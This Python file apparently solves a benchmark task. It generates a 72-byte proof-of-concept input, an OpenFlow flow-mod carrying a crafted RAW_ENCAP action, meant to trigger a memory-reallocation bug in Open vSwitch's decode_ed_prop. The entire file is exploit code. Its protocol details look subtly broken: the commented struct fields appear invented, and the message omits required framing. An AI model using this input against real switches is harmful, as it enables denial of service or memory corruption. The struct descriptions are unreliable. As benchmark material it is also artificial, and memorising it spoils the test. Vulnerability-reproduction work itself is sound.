import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAW_ENCAP action structure:
        # struct nx_action_encap {
        #     ovs_be16 type;      # NXAST_RAW_ENCAP
        #     ovs_be16 len;       # Total length including encap_data
        #     ovs_be16 dma;       # Should be 0
        #     ovs_be16 max_len;   # Max encap_data length
        #     uint8_t encap_data[];
        # };
        
        # Ground truth PoC length is 72 bytes
        # Structure breakdown:
        # - OpenFlow header: 8 bytes
        # - RAW_ENCAP action header: 8 bytes  
        # - Property header: 4 bytes
        # - Property data: 52 bytes
        
        # Build OpenFlow header
        # version = 0x01 (OpenFlow 1.0)
        # type = 0x0a (OFPT_FLOW_MOD)
        # length = 72 (total message length)
        # xid = 0
        of_header = struct.pack('!BBHI', 0x01, 0x0a, 72, 0)
        
        # RAW_ENCAP action header
        # type = 0x0008 (NXAST_RAW_ENCAP)
        # len = 64 (action length: 8 + 56 for encap_data)
        # dma = 0
        # max_len = 56 (encap_data length)
        action_header = struct.pack('!HHHH', 0x0008, 64, 0, 56)
        
        # Property header for encapsulated data
        # prop_type = 0x0000 (placeholder)
        # prop_len = 56 (property length including header)
        prop_header = struct.pack('!HH', 0x0000, 56)
        
        # Property data - designed to cause reallocation in decode_ed_prop
        # Fill with zeros that will trigger buffer growth
        prop_data = b'\x00' * 52
        
        # Combine all parts
        poc = of_header + action_header + prop_header + prop_data
        
        return poc